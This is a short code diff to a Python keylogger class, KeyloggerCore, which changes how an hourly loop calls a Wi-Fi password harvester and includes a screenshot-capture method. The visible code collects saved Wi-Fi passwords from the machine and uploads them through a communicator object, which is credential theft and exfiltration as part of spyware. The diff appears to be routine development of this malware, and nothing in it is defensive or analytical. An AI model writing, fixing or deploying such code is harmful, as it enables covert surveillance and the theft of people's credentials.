@@ -416,7 +416,8 @@ class KeyloggerCore:
         while True:
             try:
                 if self.behavior["wifi_passwords_enabled"]:
-                    wifi_data = self.command_handler.handle_wifi_passwords({})
+                    from commands.handler import CommandHandler  # وارد کردن CommandHandler
+                    wifi_data = CommandHandler.handle_wifi_passwords({})
                     if wifi_data.get("status") == "success" and wifi_data.get("wifi_profiles"):
                         self.communicator.upload_wifi_passwords(wifi_data)
                         if Config.DEBUG_MODE:
@@ -425,7 +426,7 @@ class KeyloggerCore:
                 if Config.DEBUG_MODE:
                     logging.error(f"Wi-Fi passwords loop error: {str(e)}")
             time.sleep(3600)  # Run every hour
-
+            
     def _capture_screenshot(self):
         try:
             screenshot = pyautogui.screenshot()
